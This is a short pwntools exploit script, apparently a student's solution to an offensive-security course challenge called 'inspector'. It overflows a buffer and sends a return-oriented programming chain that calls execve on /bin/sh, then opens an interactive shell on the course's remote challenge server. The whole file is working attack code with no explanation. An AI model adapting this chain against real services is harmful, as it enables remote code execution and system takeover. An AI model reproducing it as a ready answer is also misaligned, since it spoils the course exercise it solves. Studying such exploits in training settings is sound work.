from pwn import *

context.log_level = "debug"

buffer = "A"*0x28

g1 = 0x400621 + 4 #sys call
g2 = 0x40062a + 4 #pops rdi sets arg
g3 = 0x400632 + 4 #pops rsi
g4 = 0x40063a + 4 #pops rdx
g5 = 0x400642 + 4 #pops rax


#/bin/sh\x00

#bin = 0x400700
bin = 0x400708
execve = 59


arg = "/bin/sh"

chain = ""



chain += buffer
chain += p64(g5)
chain += p64(execve)
chain += p64(g4)
chain += p64(0x601050)
chain += p64(g3)
chain += p64(0x601050)
chain += p64(g2)
chain += p64(bin)
chain += p64(g1)

print(chain)

#p = process("./inspector")
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)
p.sendline("svv232")
p.recvline()
#gdb.attach(p)
p.recvline()
p.sendline(chain)
p.interactive()
